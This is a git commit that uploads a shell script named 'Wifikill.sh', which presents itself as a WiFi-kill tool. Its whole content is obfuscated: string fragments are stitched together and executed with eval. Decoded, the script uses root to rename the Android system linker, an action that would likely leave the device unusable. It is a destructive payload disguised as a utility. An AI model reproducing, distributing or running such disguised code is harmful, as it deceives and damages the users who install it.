9569d701fbacea543edc4f262c4b909bc08e2c61
KangSantuy <pancasyah191@gmail.com>
2023-01-17 02:42:13 +0700

    Add files via upload

---
+++ Wifikill.sh
@@ -0,0 +1,7 @@
+z="
+";Lz='rcdc';Hz='ddjh';Mz='ddcd';Bz='ssiw';Qz='dkdk';iz='k_lu';Gz='jjdj';fz='stem';Pz='kddk';Ez='jjhs';Xz='c '\''r';Vz='bhhh';Rz='kdkd';az='yste';Sz='krij';hz='/lin';Dz='shsj';Az='a#dj';Jz='fvfv';cz='n/li';Zz='e /s';Kz='rcrv';ez=' /sy';gz='/bin';Cz='iisj';Fz='hhsj';Oz='ksks';dz='nker';Wz='su -';jz='nk'\''';bz='m/bi';Yz='enam';Nz='cdsk';Uz='bbbb';Tz='jjjh';Iz='tvtv';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Rz$Sz$Tz$Uz$Vz$z$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz"
+
+
+
+
